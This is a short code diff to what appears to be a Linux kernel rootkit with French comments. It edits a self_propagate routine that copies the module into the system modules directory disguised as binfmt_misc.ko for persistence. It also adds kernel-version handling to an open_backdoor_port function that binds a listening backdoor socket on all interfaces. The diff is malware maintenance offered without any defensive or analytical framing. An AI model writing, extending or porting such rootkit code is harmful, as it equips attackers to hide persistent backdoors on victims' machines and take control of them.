@@ -668,8 +668,8 @@ static void self_propagate(void)
     uts = utsname();
     if (!uts) return;
 
-    // Source : Chemin local de l'archive (Attention : Chemin en dur)
-    snprintf(src_path, sizeof(src_path), "/tmp/rk_test.ko");
+    // Source
+    snprintf(src_path, sizeof(src_path), "/tmp/rk.ko");
     
     // Destination : Chemin système où le module doit être caché
     snprintf(dst_path, sizeof(dst_path), "/lib/modules/%s/%s/binfmt_misc.ko", uts->release, PERSIST_DIR);
@@ -1430,7 +1430,11 @@ static int open_backdoor_port(int port)
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0)
     ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
+#else
+    ret = kernel_bind(backdoor_sock, (struct sockaddr *)&addr, sizeof(addr));
+#endif
     if (ret < 0)
         goto out;
 
